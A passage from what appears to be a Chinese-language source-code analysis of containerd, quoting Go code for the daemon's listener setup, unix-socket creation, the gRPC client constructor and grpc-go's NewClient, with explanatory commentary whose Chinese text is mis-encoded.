err) } } else { if l, err = net.Listen(\u0026#34;tcp\u0026#34;, config.Debug.Address); err != nil { return fmt.Errorf(\u0026#34;failed to get listener for debug endpoint: %w\u0026#34;, err) } } serve(ctx, l, server.ServeDebug) } if config.Metrics.Address != \u0026#34;\u0026#34; { l, err := net.Listen(\u0026#34;tcp\u0026#34;, config.Metrics.Address) if err != nil { return fmt.Errorf(\u0026#34;failed to get listener for metrics endpoint: %w\u0026#34;, err) } serve(ctx, l, server.ServeMetrics) } tl, err := sys.GetLocalListener(config.TTRPC.Address, config.TTRPC.UID, config.TTRPC.GID) if err != nil { return fmt.Errorf(\u0026#34;failed to get listener for main ttrpc endpoint: %w\u0026#34;, err) } serve(ctx, tl, server.ServeTTRPC) if config.GRPC.TCPAddress != \u0026#34;\u0026#34; { l, err := net.Listen(\u0026#34;tcp\u0026#34;, config.GRPC.TCPAddress) if err != nil { return fmt.Errorf(\u0026#34;failed to get listener for TCP grpc endpoint: %w\u0026#34;, err) } serve(ctx, l, server.ServeTCP) } l, err := sys.GetLocalListener(config.GRPC.Address, config.GRPC.UID, config.GRPC.GID) if err != nil { return fmt.Errorf(\u0026#34;failed to get listener for main endpoint: %w\u0026#34;, err) } serve(ctx, l, server.ServeGRPC) å¯åŠ¨è°ƒè¯•æœåŠ¡: å¦‚æœé…ç½®äº†è°ƒè¯•åœ°å€ï¼Œè°ƒç”¨ serve å¯åŠ¨è°ƒè¯•æœåŠ¡ (ServeDebug)ã€‚ å¯åŠ¨åº¦é‡æœåŠ¡: å¦‚æœé…ç½®äº†åº¦é‡åœ°å€ï¼Œè°ƒç”¨ serve å¯åŠ¨åº¦é‡æœåŠ¡ (ServeMetrics)ã€‚ å¯åŠ¨ TTRPC æœåŠ¡: ä½¿ç”¨ sys.GetLocalListener è·å–æœ¬åœ°ç›‘å¬å™¨å¹¶å¯åŠ¨ TTRPC æœåŠ¡ (ServeTTRPC)ã€‚ å¯åŠ¨ gRPC æœåŠ¡: å¦‚æœé…ç½®äº† TCP gRPC åœ°å€ï¼Œåˆ™é€šè¿‡ TCP å¯åŠ¨ gRPC æœåŠ¡ (ServeTCP)ã€‚åŒæ—¶ï¼Œè¿˜ä¼šä¸ºä¸»è¦çš„ gRPC æœåŠ¡é…ç½® Unix Domain Socket (UDS) å¹¶å¯åŠ¨æœåŠ¡ (ServeGRPC)ã€‚ æœåŠ¡å¯åŠ¨ä¸å¤„ç†\nserve å‡½æ•°ç”¨äºå¯åŠ¨æŒ‡å®šçš„æœåŠ¡ï¼Œæ¥å—ä¸€ä¸ªç›‘å¬å™¨ l å’Œä¸€ä¸ªæœåŠ¡å‡½æ•° serveFunc ä½œä¸ºå‚æ•°ã€‚å®ƒåœ¨æ–°çš„ goroutine ä¸­æ‰§è¡ŒæœåŠ¡å‡½æ•°ï¼Œå¹¶åœ¨æœåŠ¡ç»“æŸåå…³é—­ç›‘å¬å™¨ã€‚\nfunc serve(ctx context.Context, l net.Listener, serveFunc func(net.Listener) error) { path := l.Addr().String() log.G(ctx).WithField(\u0026#34;address\u0026#34;, path).Info(\u0026#34;serving...\u0026#34;) go func() { defer l.Close() if err := serveFunc(l); err != nil { log.G(ctx).WithError(err).WithField(\u0026#34;address\u0026#34;, path).Fatal(\u0026#34;serve failure\u0026#34;) } }() } åœ¨å¯åŠ¨ gRPC ä¸­è°ƒç”¨äº†sys.GetLocalListener()ï¼Œè¿™ä¸ªå‡½æ•°åœ¨ä¸‹é¢çš„å‡½æ•°ä¸­è¢«å®šä¹‰ã€‚\næ–‡ä»¶è·¯å¾„ï¼šcontainerd/pkg/sys/socket_unix.goï¼Œè¿™ä¸ªæ–‡ä»¶æ¶‰åŠåˆ°äº†udsæ–‡ä»¶çš„åˆ›å»ºã€‚\npackage sys import ( \u0026#34;fmt\u0026#34; \u0026#34;net\u0026#34; \u0026#34;os\u0026#34; \u0026#34;path/filepath\u0026#34; \u0026#34;golang.org/x/sys/unix\u0026#34; ) // CreateUnixSocket creates a unix socket and returns the listener func CreateUnixSocket(path string) (net.Listener, error) { // BSDs have a 104 limit if len(path) \u0026gt; 104 { return nil, fmt.Errorf(\u0026#34;%q: unix socket path too long (\u0026gt; 104)\u0026#34;, path) } if err := os.MkdirAll(filepath.Dir(path), 0660); err != nil { return nil, err } if err := unix.Unlink(path); err != nil \u0026amp;\u0026amp; !os.IsNotExist(err) { return nil, err } return net.Listen(\u0026#34;unix\u0026#34;, path) } // GetLocalListener returns a listener out of a unix socket. func GetLocalListener(path string, uid, gid int) (net.Listener, error) { // Ensure parent directory is created if err := mkdirAs(filepath.Dir(path), uid, gid); err != nil { return nil, err } l, err := CreateUnixSocket(path) if err != nil { return l, err } if err := os.Chmod(path, 0660); err != nil { l.Close() return nil, err } if err := os.Chown(path, uid, gid); err != nil { l.Close() return nil, err } return l, nil } func mkdirAs(path string, uid, gid int) error { if _, err := os.Stat(path); !os.IsNotExist(err) { return err } if err := os.MkdirAll(path, 0770); err != nil { return err } return os.Chown(path, uid, gid) } è¯¦ç»†åˆ†æï¼š\nCreateUnixSocket å‡½æ•°\nfunc CreateUnixSocket(path string) (net.Listener, error) { // BSDs have a 104 limit if len(path) \u0026gt; 104 { return nil, fmt.Errorf(\u0026#34;%q: unix socket path too long (\u0026gt; 104)\u0026#34;, path) } if err := os.MkdirAll(filepath.Dir(path), 0660); err != nil { return nil, err } if err := unix.Unlink(path); err != nil \u0026amp;\u0026amp; !os.IsNotExist(err) { return nil, err } return net.Listen(\u0026#34;unix\u0026#34;, path) } CreateUnixSocket å‡½æ•°ç”¨äºåˆ›å»ºä¸€ä¸ª Unix Domain Socketï¼Œå¹¶è¿”å›ä¸€ä¸ªç”¨äºç›‘å¬è¿æ¥çš„ net.Listener å®ä¾‹ã€‚\nè¯¦ç»†åˆ†æï¼š\nè·¯å¾„é•¿åº¦æ£€æŸ¥ï¼šé¦–å…ˆï¼Œå‡½æ•°æ£€æŸ¥å¥—æ¥å­—è·¯å¾„çš„é•¿åº¦æ˜¯å¦è¶…è¿‡äº† 104 ä¸ªå­—ç¬¦ã€‚è¿™æ˜¯å› ä¸ºåœ¨ä¸€äº› BSD ç³»ç»Ÿä¸­ï¼ŒUnix Domain Socket çš„è·¯å¾„é•¿åº¦é™åˆ¶ä¸º 104 ä¸ªå­—ç¬¦ã€‚å¦‚æœè·¯å¾„å¤ªé•¿ï¼Œå‡½æ•°ä¼šè¿”å›ä¸€ä¸ªé”™è¯¯ã€‚ åˆ›å»ºçˆ¶ç›®å½•ï¼šä½¿ç”¨ os.MkdirAll åˆ›å»º Unix Socket çš„çˆ¶ç›®å½•ã€‚å¦‚æœè¯¥ç›®å½•ä¸å­˜åœ¨ï¼ŒMkdirAll ä¼šé€’å½’åœ°åˆ›å»ºç›®å½•ã€‚ç›®å½•æƒé™è®¾ç½®ä¸º 0660ã€‚ åˆ é™¤ç°æœ‰çš„ Unix Socket æ–‡ä»¶ï¼šè°ƒç”¨ unix.Unlink å°è¯•åˆ é™¤æŒ‡å®šè·¯å¾„ä¸Šçš„ç°æœ‰æ–‡ä»¶ï¼ˆå¦‚æœå­˜åœ¨ï¼‰ï¼Œä»¥ç¡®ä¿æ–°åˆ›å»ºçš„å¥—æ¥å­—æ–‡ä»¶ä¸ä¼šä¸æ—§æ–‡ä»¶å†²çªã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼ŒUnlink ä¼šè¿”å›ä¸€ä¸ªé”™è¯¯ï¼Œä½†å¦‚æœé”™è¯¯ç±»å‹æ˜¯ os.IsNotExistï¼Œè¡¨ç¤ºæ–‡ä»¶æœ¬æ¥å°±ä¸å­˜åœ¨ï¼Œè¿™æ—¶ä¼šå¿½ç•¥è¿™ä¸ªé”™è¯¯ã€‚ åˆ›å»º Unix Socketï¼šæœ€åï¼Œä½¿ç”¨ net.Listen(\u0026quot;unix\u0026quot;, path) åˆ›å»ºä¸€ä¸ª Unix Domain Socketï¼Œå¹¶è¿”å›ä¸€ä¸ª net.Listenerï¼Œä¾›åç»­ä½¿ç”¨ã€‚ GetLocalListener å‡½æ•°\nfunc GetLocalListener(path string, uid, gid int) (net.Listener, error) { // Ensure parent directory is created if err := mkdirAs(filepath.Dir(path), uid, gid); err != nil { return nil, err } l, err := CreateUnixSocket(path) if err != nil { return l, err } if err := os.Chmod(path, 0660); err != nil { l.Close() return nil, err } if err := os.Chown(path, uid, gid); err != nil { l.Close() return nil, err } return l, nil } GetLocalListener å‡½æ•°ç”¨äºåˆ›å»ºä¸€ä¸ªæœ¬åœ°çš„ Unix Domain Socket ç›‘å¬å™¨ï¼Œå¹¶è®¾ç½®ç›¸åº”çš„æƒé™å’Œæ‰€æœ‰è€…ä¿¡æ¯ã€‚\nè¯¦ç»†åˆ†æï¼š\nåˆ›å»ºçˆ¶ç›®å½•ï¼šè°ƒç”¨ mkdirAs å‡½æ•°ç¡®ä¿ Unix Socket çš„çˆ¶ç›®å½•å·²ç»åˆ›å»ºï¼Œå¹¶è®¾ç½®äº†é€‚å½“çš„ç”¨æˆ· ID (uid) å’Œç»„ ID (gid)ã€‚ åˆ›å»º Unix Socketï¼šä½¿ç”¨ CreateUnixSocket å‡½æ•°åˆ›å»º Unix Domain Socketã€‚ è®¾ç½®æƒé™ï¼šä½¿ç”¨ os.Chmod è®¾ç½® Unix Socket æ–‡ä»¶çš„æƒé™ä¸º 0660ï¼Œå³æ–‡ä»¶æ‰€æœ‰è€…å’Œç»„æˆå‘˜å¯è¯»å†™ï¼Œå…¶ä»–ç”¨æˆ·æ— æƒé™ã€‚ è®¾ç½®æ‰€æœ‰è€…ï¼šä½¿ç”¨ os.Chown å°† Unix Socket æ–‡ä»¶çš„æ‰€æœ‰è€…å’Œç»„è®¾ç½®ä¸ºæŒ‡å®šçš„ uid å’Œ gidã€‚ è¿”å›ç›‘å¬å™¨ï¼šå¦‚æœæ‰€æœ‰æ“ä½œéƒ½æˆåŠŸï¼Œè¿”å›åˆ›å»ºçš„ net.Listener å®ä¾‹ã€‚å¦‚æœåœ¨è¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯ï¼Œå…³é—­å·²åˆ›å»ºçš„ç›‘å¬å™¨ï¼Œå¹¶è¿”å›é”™è¯¯ä¿¡æ¯ã€‚ mkdirAs å‡½æ•°\nfunc mkdirAs(path string, uid, gid int) error { if _, err := os.Stat(path); !os.IsNotExist(err) { return err } if err := os.MkdirAll(path, 0770); err != nil { return err } return os.Chown(path, uid, gid) } mkdirAs å‡½æ•°ç”¨äºåˆ›å»ºæŒ‡å®šçš„ç›®å½•ï¼Œå¹¶è®¾ç½®è¯¥ç›®å½•çš„æ‰€æœ‰è€…å’Œæƒé™ã€‚\nè¯¦ç»†åˆ†æï¼š\næ£€æŸ¥ç›®å½•æ˜¯å¦å­˜åœ¨ï¼šä½¿ç”¨ os.Stat æ£€æŸ¥ç›®æ ‡ç›®å½•æ˜¯å¦å·²ç»å­˜åœ¨ã€‚å¦‚æœç›®å½•å­˜åœ¨ï¼Œè¿”å›è¯¥ç›®å½•çš„çŠ¶æ€ä¿¡æ¯æˆ–é”™è¯¯ã€‚å¦‚æœç›®å½•ä¸å­˜åœ¨ï¼Œç»§ç»­æ‰§è¡Œã€‚ åˆ›å»ºç›®å½•ï¼šä½¿ç”¨ os.MkdirAll åˆ›å»ºç›®æ ‡ç›®å½•ï¼Œå¹¶å°†æƒé™è®¾ç½®ä¸º 0770ï¼ˆå³æ‰€æœ‰è€…å’Œç»„æˆå‘˜å¯ä»¥è¯»å†™æ‰§è¡Œï¼Œå…¶ä»–ç”¨æˆ·æ— æƒé™ï¼‰ã€‚ è®¾ç½®æ‰€æœ‰è€…ï¼šä½¿ç”¨ os.Chown å°†ç›®å½•çš„æ‰€æœ‰è€…å’Œç»„è®¾ç½®ä¸ºæŒ‡å®šçš„ uid å’Œ gidã€‚ è¿”å›ç»“æœï¼šå¦‚æœæ‰€æœ‰æ“ä½œéƒ½æˆåŠŸï¼Œè¿”å› nilã€‚å¦‚æœä»»ä½•æ­¥éª¤å‡ºé”™ï¼Œåˆ™è¿”å›ç›¸åº”çš„é”™è¯¯ä¿¡æ¯ã€‚ clientä¸containerdå®ˆæŠ¤è¿›ç¨‹çš„é€šä¿¡ æ–‡ä»¶è·¯å¾„ï¼šcontainerd/client/client.goï¼Œè¿™æ®µä»£ç æ˜¯ containerd é¡¹ç›®ä¸­ client åŒ…çš„å®ç°ï¼Œè´Ÿè´£åˆ›å»ºä¸ containerd å®ˆæŠ¤è¿›ç¨‹é€šä¿¡çš„å®¢æˆ·ç«¯å®ä¾‹ã€‚å®ƒåŒ…å«äº†ä¸ containerd è¿›è¡Œ gRPC é€šä¿¡çš„åŸºç¡€è®¾æ–½ï¼Œæä¾›äº†ä¸€ç»„æ–¹æ³•ï¼Œç”¨äºä¸ containerd çš„å„ç§æœåŠ¡è¿›è¡Œäº¤äº’ï¼Œä¾‹å¦‚å®¹å™¨ç®¡ç†ã€é•œåƒç®¡ç†ã€å¿«ç…§ç®¡ç†ç­‰ã€‚\nClient ç»“æ„ä½“ type Client struct { services connMu sync.Mutex conn *grpc.ClientConn runtime string defaultns string platform platforms.MatchComparer connector func() (*grpc.ClientConn, error) } services: å†…åµŒçš„ services ç»“æ„ä½“ï¼ŒåŒ…å«äº†ä¸ containerd æœåŠ¡é€šä¿¡çš„å…·ä½“æ–¹æ³•ï¼Œå¦‚ ContainerServiceã€ImageService ç­‰ã€‚ conn: ä¸€ä¸ª gRPC è¿æ¥å¯¹è±¡ï¼Œç”¨äºä¸ containerd å®ˆæŠ¤è¿›ç¨‹é€šä¿¡ã€‚ connMu: ä¸€ä¸ªäº’æ–¥é”ï¼Œç”¨äºåœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ä¿æŠ¤ conn å¯¹è±¡çš„å¹¶å‘è®¿é—®ã€‚ runtime: è¡¨ç¤ºå½“å‰ä½¿ç”¨çš„å®¹å™¨è¿è¡Œæ—¶ã€‚ defaultns: å®¢æˆ·ç«¯çš„é»˜è®¤å‘½åç©ºé—´ã€‚ platform: å¹³å°åŒ¹é…å™¨ï¼Œç”¨äºç¡®å®šè¿è¡Œåœ¨ç‰¹å®šå¹³å°ä¸Šçš„å®¹å™¨ã€‚ connector: ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºé‡æ–°è¿æ¥åˆ° containerd å®ˆæŠ¤è¿›ç¨‹ã€‚ New å‡½æ•° New å‡½æ•°ç”¨äºåˆ›å»ºä¸€ä¸ªæ–°çš„ Client å®ä¾‹ï¼Œè¿æ¥åˆ°æŒ‡å®šçš„ containerd å®ˆæŠ¤è¿›ç¨‹åœ°å€ã€‚\nfunc New(address string, opts ...Opt) (*Client, error) { var copts clientOpts for _, o := range opts { if err := o(\u0026amp;copts); err != nil { return nil, err } } if copts.timeout == 0 { copts.timeout = 10 * time.Second } c := \u0026amp;Client{ defaultns: copts.defaultns, } if copts.defaultRuntime != \u0026#34;\u0026#34; { c.runtime = copts.defaultRuntime } else { c.runtime = defaults.DefaultRuntime } if copts.defaultPlatform != nil { c.platform = copts.defaultPlatform } else { c.platform = platforms.Default() } if copts.services != nil { c.services = *copts.services } if address != \u0026#34;\u0026#34; { backoffConfig := backoff.DefaultConfig backoffConfig.MaxDelay = copts.timeout connParams := grpc.ConnectParams{ Backoff: backoffConfig, } gopts := []grpc.DialOption{ grpc.WithTransportCredentials(insecure.NewCredentials()), grpc.WithConnectParams(connParams), grpc.WithContextDialer(dialer.ContextDialer), } if len(copts.dialOptions) \u0026gt; 0 { gopts = copts.dialOptions } gopts = append(gopts, grpc.WithDefaultCallOptions( grpc.MaxCallRecvMsgSize(defaults.DefaultMaxRecvMsgSize), grpc.MaxCallSendMsgSize(defaults.DefaultMaxSendMsgSize))) if len(copts.callOptions) \u0026gt; 0 { gopts = append(gopts, grpc.WithDefaultCallOptions(copts.callOptions...)) } if copts.defaultns != \u0026#34;\u0026#34; { unary, stream := newNSInterceptors(copts.defaultns) gopts = append(gopts, grpc.WithChainUnaryInterceptor(unary)) gopts = append(gopts, grpc.WithChainStreamInterceptor(stream)) } connector := func() (*grpc.ClientConn, error) { conn, err := grpc.NewClient(dialer.DialAddress(address), gopts...) //gRPCè¿æ¥ if err != nil { return nil, fmt.Errorf(\u0026#34;failed to dial %q: %w\u0026#34;, address, err) } return conn, nil } conn, err := connector() if err != nil { return nil, err } c.conn, c.connector = conn, connector } if copts.services == nil \u0026amp;\u0026amp; c.conn == nil { return nil, fmt.Errorf(\u0026#34;no grpc connection or services is available: %w\u0026#34;, errdefs.ErrUnavailable) } // check namespace labels for default runtime if copts.defaultRuntime == \u0026#34;\u0026#34; \u0026amp;\u0026amp; c.defaultns != \u0026#34;\u0026#34; { if label, err := c.GetLabel(context.Background(), defaults.DefaultRuntimeNSLabel); err != nil { return nil, err } else if label != \u0026#34;\u0026#34; { c.runtime = label } } return c, nil } é€‰é¡¹è§£æ: copts ç”¨äºå­˜å‚¨å®¢æˆ·ç«¯é…ç½®é€‰é¡¹ï¼Œé€šè¿‡ä¼ å…¥çš„ opts è¿›è¡Œè§£æé…ç½®ã€‚ é»˜è®¤é…ç½®è®¾ç½®: å¦‚æœæœªæŒ‡å®šè¿è¡Œæ—¶ã€å¹³å°ç­‰é€‰é¡¹ï¼Œä½¿ç”¨é»˜è®¤å€¼è¿›è¡Œåˆå§‹åŒ–ã€‚ gRPC è¿æ¥: é…ç½®äº†è¿æ¥å‚æ•°å’Œæ‹¨å·é€‰é¡¹ï¼ˆå¦‚è¶…æ—¶ã€TLSã€å®‰å…¨å‡­è¯ç­‰ï¼‰ã€‚ ä½¿ç”¨ grpc.NewClient å»ºç«‹åˆ° containerd å®ˆæŠ¤è¿›ç¨‹çš„ gRPC è¿æ¥ã€‚ è¿æ¥æˆåŠŸåï¼Œä¿å­˜è¿æ¥å¯¹è±¡ conn å’Œé‡æ–°è¿æ¥çš„å‡½æ•° connectorã€‚ å‘½åç©ºé—´æ ‡ç­¾æ£€æŸ¥: å¦‚æœæ²¡æœ‰æŒ‡å®šè¿è¡Œæ—¶ï¼Œå¹¶ä¸”è®¾ç½®äº†é»˜è®¤å‘½åç©ºé—´ï¼Œä¼šå°è¯•ä»å‘½åç©ºé—´æ ‡ç­¾ä¸­è·å–é»˜è®¤è¿è¡Œæ—¶ã€‚ é”™è¯¯å¤„ç†: å¦‚æœæ— æ³•å»ºç«‹ gRPC è¿æ¥ï¼Œæˆ–æœªæä¾›è¿æ¥æˆ–æœåŠ¡ï¼Œåˆ™è¿”å›é”™è¯¯ã€‚ NewWithConn å‡½æ•° NewWithConn å‡½æ•°ç”¨äºåˆ›å»ºä¸€ä¸ªä¸ç°æœ‰çš„ gRPC è¿æ¥å…³è”çš„ Client å®ä¾‹ã€‚\nfunc NewWithConn(conn *grpc.ClientConn, opts ...Opt) (*Client, error) { var copts clientOpts for _, o := range opts { if err := o(\u0026amp;copts); err != nil { return nil, err } } c := \u0026amp;Client{ defaultns: copts.defaultns, conn: conn, runtime: defaults.DefaultRuntime, } if copts.defaultPlatform != nil { c.platform = copts.defaultPlatform } else { c.platform = platforms.Default() } // check namespace labels for default runtime if copts.defaultRuntime == \u0026#34;\u0026#34; \u0026amp;\u0026amp; c.defaultns != \u0026#34;\u0026#34; { if label, err := c.GetLabel(context.Background(), defaults.DefaultRuntimeNSLabel); err != nil { return nil, err } else if label != \u0026#34;\u0026#34; { c.runtime = label } } if copts.services != nil { c.services = *copts.services } return c, nil } å‚æ•°è¯´æ˜: conn: ä¸€ä¸ªç°æœ‰çš„ gRPC è¿æ¥å®ä¾‹ã€‚ opts: å¯é€‰çš„å®¢æˆ·ç«¯é…ç½®é€‰é¡¹ã€‚ åˆå§‹åŒ–: ä¸ New å‡½æ•°ç±»ä¼¼ï¼Œåˆå§‹åŒ– Client å®ä¾‹ï¼Œè®¾ç½®é»˜è®¤è¿è¡Œæ—¶å’Œå¹³å°ã€‚ å¦‚æœä¼ å…¥äº†æœåŠ¡é…ç½® servicesï¼Œåˆ™ä½¿ç”¨è¯¥é…ç½®ã€‚ Reconnect å‡½æ•° Reconnect å‡½æ•°ç”¨äºé‡æ–°å»ºç«‹ä¸ containerd å®ˆæŠ¤è¿›ç¨‹çš„ gRPC è¿æ¥ã€‚\nfunc (c *Client) Reconnect() error { if c.connector == nil { return fmt.Errorf(\u0026#34;unable to reconnect to containerd, no connector available: %w\u0026#34;, errdefs.ErrUnavailable) } c.connMu.Lock() defer c.connMu.Unlock() c.conn.Close() conn, err := c.connector() if err != nil { return err } c.conn = conn return nil } é”å®šè¿æ¥: ä½¿ç”¨ connMu äº’æ–¥é”æ¥é˜²æ­¢å¹¶å‘ä¿®æ”¹ conn å¯¹è±¡ã€‚ å…³é—­æ—§è¿æ¥: å…³é—­ç°æœ‰çš„ gRPC è¿æ¥ã€‚ é‡æ–°è¿æ¥: ä½¿ç”¨ connector å‡½æ•°é‡æ–°å»ºç«‹è¿æ¥ï¼Œå¹¶å°†æ–°è¿æ¥èµ‹å€¼ç»™ connã€‚ IsServing å‡½æ•° IsServing å‡½æ•°ç”¨äºæ£€æŸ¥ containerd å®ˆæŠ¤è¿›ç¨‹æ˜¯å¦æ­£åœ¨è¿è¡Œï¼Œå¹¶è¿”å› SERVING çŠ¶æ€ã€‚\nfunc (c *Client) IsServing(ctx context.Context) (bool, error) { c.connMu.Lock() if c.conn == nil { c.connMu.Unlock() return false, fmt.Errorf(\u0026#34;no grpc connection available: %w\u0026#34;, errdefs.ErrUnavailable) } c.connMu.Unlock() r, err := c.HealthService().Check(ctx, \u0026amp;grpc_health_v1.HealthCheckRequest{}, grpc.WaitForReady(true)) if err != nil { return false, err } return r.Status == grpc_health_v1.HealthCheckResponse_SERVING, nil } é”å®šè¿æ¥: ç¡®ä¿åœ¨æ£€æŸ¥è¿æ¥çŠ¶æ€æ—¶ä¸ä¼šæœ‰å…¶ä»–çº¿ç¨‹ä¿®æ”¹ conn å¯¹è±¡ã€‚ å¥åº·æ£€æŸ¥: è°ƒç”¨ HealthService().Check æ–¹æ³•ï¼Œæ£€æŸ¥ containerd çš„å¥åº·çŠ¶æ€ï¼Œç¡®å®šæœåŠ¡æ˜¯å¦å¯ç”¨ã€‚ è¿”å›å€¼: å¦‚æœæœåŠ¡æ­£åœ¨è¿è¡Œå¹¶è¿”å› SERVING çŠ¶æ€ï¼Œåˆ™è¿”å› trueï¼Œå¦åˆ™è¿”å› false å’Œé”™è¯¯ä¿¡æ¯ã€‚ åœ¨ containerd çš„ä»£ç ä¸­ï¼Œè°ƒç”¨ grpc.NewClient å‡½æ•°å®é™…ä¸Šæ˜¯ç›´æ¥ä½¿ç”¨ gRPC åº“ä¸­çš„è¿™ä¸ªå‡½æ•°æ¥åˆ›å»º gRPC å®¢æˆ·ç«¯è¿æ¥ã€‚è¿™ä¸ªå‡½æ•°å†…éƒ¨ä¼šåˆ›å»ºå’Œç®¡ç†ä¸ containerd æœåŠ¡å™¨çš„ gRPC è¿æ¥ï¼Œä¸‹ä¸€éƒ¨åˆ†å°†è¯¦ç»†åˆ†ægRPCæ¡†æ¶ã€‚\næºç é“¾æ¥ï¼šgrpc-go/clientconn.go at v1.65.0 Â· grpc/grpc-go (github.com)\nfunc NewClient(target string, opts ...DialOption) (conn *ClientConn, err error) { cc := \u0026amp;ClientConn{ target: target, conns: make(map[*addrConn]struct{}), dopts: defaultDialOptions(), } cc.retryThrottler.Store((*retryThrottler)(nil)) cc.safeConfigSelector.UpdateConfigSelector(\u0026amp;defaultConfigSelector{nil}) cc.ctx, cc.cancel = context.WithCancel(context.Background()) // Apply dial options. disableGlobalOpts := false for _, opt := range opts { if _, ok := opt.(*disableGlobalDialOptions); ok { disableGlobalOpts = true break } } if !disableGlobalOpts { for _, opt := range globalDialOptions { opt.apply(\u0026amp;cc.dopts) } } for _, opt := range opts { opt.apply(\u0026amp;cc.dopts) } // Determine the resolver to use. if err := cc.initParsedTargetAndResolverBuilder(); err != nil { return nil, err } for _, opt := range globalPerTargetDialOptions { opt.DialOptionForTarget(cc.parsedTarget.URL).apply(\u0026amp;cc.dopts) } chainUnaryClientInterceptors(cc) chainStreamClientInterceptors(cc) if err := cc.validateTransportCredentials(); err != nil { return nil, err } if cc.dopts.defaultServiceConfigRawJSON != nil { scpr := parseServiceConfig(*cc.dopts.defaultServiceConfigRawJSON, cc.dopts.maxCallAttempts) if scpr.Err != nil { return nil, fmt.Errorf(\u0026#34;%s: %v\u0026#34;, invalidDefaultServiceConfigErrPrefix, scpr.Err) } cc.dopts.defaultServiceConfig, _ = scpr.Config.(*ServiceConfig) } cc.mkp = cc.dopts.copts.KeepaliveParams if err = cc.initAuthority(); err != nil { return nil, err } // Register ClientConn with channelz. Note that this is only done after // channel creation cannot fail. cc.channelzRegistration(target) channelz.Infof(logger, cc.channelz, \u0026#34;parsed dial target is: %#v\u0026#34;, cc.parsedTarget) channelz.Infof(logger, cc.channelz, \u0026#34;Channel authority set to %q\u0026#34;, cc.authority) cc.csMgr = newConnectivityStateManager(cc.ctx, cc.channelz) cc.pickerWrapper = newPickerWrapper(cc.dopts.copts.StatsHandlers) cc.initIdleStateLocked() // Safe to call without the lock, since nothing else has a reference to cc. cc.idlenessMgr = idle.NewManager((*idler)(cc), cc.dopts.idleTimeout) return cc, nil } åœ¨ gRPC æ¡†æ¶ä¸­ï¼ŒNewClient å‡½æ•°è´Ÿè´£ä¸ºç»™å®šçš„ç›®æ ‡ URI åˆ›å»ºä¸€ä¸ª gRPC â€œé€šé“â€ï¼ˆå³ ClientConnï¼‰ã€‚ClientConn æ˜¯ gRPC å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´çš„è™šæ‹Ÿè¿æ¥ï¼Œå®ƒå¯ä»¥æ ¹æ®éœ€è¦åˆ›å»ºå¤šä¸ªå®é™…è¿æ¥ã€‚è¿™ä¸ªå‡½æ•°ä¸»è¦æ‰§è¡Œä»¥ä¸‹ä»»åŠ¡ï¼š\nè§£æç›®æ ‡ URIï¼šæ ¹æ®ç›®æ ‡ URI çš„æ–¹æ¡ˆï¼ˆå¦‚ dns:// æˆ– passthrough://ï¼‰ï¼Œé€‰æ‹©åˆé€‚çš„è§£æå™¨æ¥è§£ææœåŠ¡åœ°å€ã€‚ é…ç½®è¿æ¥å‚æ•°ï¼šåº”ç”¨å„ç§æ‹¨å·é€‰é¡¹ï¼ˆå¦‚å®‰å…¨å‡­è¯ã€è´Ÿè½½å‡è¡¡ç­–ç•¥ã€é‡è¯•ç­–ç•¥ç­‰ï¼‰ï¼Œå¹¶åˆå§‹åŒ– ClientConn çš„çŠ¶æ€ã€‚ åˆ›å»ºè¿æ¥ï¼šåœ¨åå°å°è¯•ä¸ç›®æ ‡åœ°å€å»ºç«‹è¿æ¥ï¼Œå¹¶æ ¹æ®è¿æ¥çŠ¶æ€æ›´æ–° ClientConn çš„çŠ¶æ€ã€‚ ç®¡ç†è¿æ¥ç”Ÿå‘½å‘¨æœŸï¼šåœ¨è¿æ¥çš„ç”Ÿå‘½å‘¨æœŸä¸­ï¼ŒClientConn ä¼šè‡ªåŠ¨å¤„ç†è¿æ¥å¤±è´¥ã€é‡è¿ã€è´Ÿè½½å‡è¡¡ç­‰é€»è¾‘ã€‚ gRPCæ¡†æ¶ä¸­çš„RPCé€šä¿¡ gRPC-Go ä¸­ RPC é€šä¿¡ Goç‰ˆæœ¬gRPCé€šä¿¡æœºåˆ¶æ¦‚è¿° åœ¨ gRPC-Go ä¸­ï¼Œå®¢æˆ·ç«¯å‘èµ·çš„æ¯ä¸€ä¸ª RPC è°ƒç”¨éƒ½ä¼šæ¶‰åŠåˆ°ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š\nå‘èµ· RPC è¯·æ±‚ï¼šå®¢æˆ·ç«¯åˆ›å»ºä¸€ä¸ª RPC è°ƒç”¨ï¼Œå¹¶å‘é€å…ƒæ•°æ®å’Œè¯·æ±‚æ•°æ®ã€‚ æœåŠ¡å™¨å¤„ç†è¯·æ±‚ï¼šæœåŠ¡å™¨æ¥æ”¶åˆ°è¯·æ±‚ï¼Œå¤„ç†å¹¶ç”Ÿæˆå“åº”ã€‚ å‘é€å“åº”ï¼šæœåŠ¡å™¨å°†å“åº”å‘é€å›å®¢æˆ·ç«¯ã€‚ æ¥æ”¶å“åº”ï¼šå®¢æˆ·ç«¯æ¥æ”¶åˆ°å“åº”ï¼Œå¹¶å°†ç»“æœè¿”å›ç»™ç”¨æˆ·ã€‚ Goç‰ˆæœ¬gRPCæºç ç»“æ„ gRPC-Go çš„æºç ä¸»è¦åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ¨¡å—ï¼š\ntransportï¼šè´Ÿè´£åº•å±‚ HTTP/2 ä¼ è¾“çš„å®ç°ã€‚ streamï¼šç®¡ç†å’Œæ§åˆ¶ gRPC çš„æµã€‚ server å’Œ clientï¼šåˆ†åˆ«ç®¡ç† gRPC æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯çš„ç”Ÿå‘½å‘¨æœŸã€‚ codecï¼šç”¨äºæ¶ˆæ¯çš„ç¼–ç å’Œè§£ç ã€‚ gRPC-Go ä¸­ RPC é€šä¿¡æµç¨‹çš„æºç åˆ†æ ClientConn çš„åˆå§‹åŒ– func NewClient(target string, opts ...DialOption) (*ClientConn, error) { cc := \u0026amp;ClientConn{ target: target, conns: make(map[*addrConn]struct{}), dopts: defaultDialOptions(), } // è§£æ target åœ°å€ï¼Œé€‰æ‹©åˆé€‚çš„ resolver (è§£æå™¨) if err := cc.initParsedTargetAndResolverBuilder(); err != nil { return nil, err } // 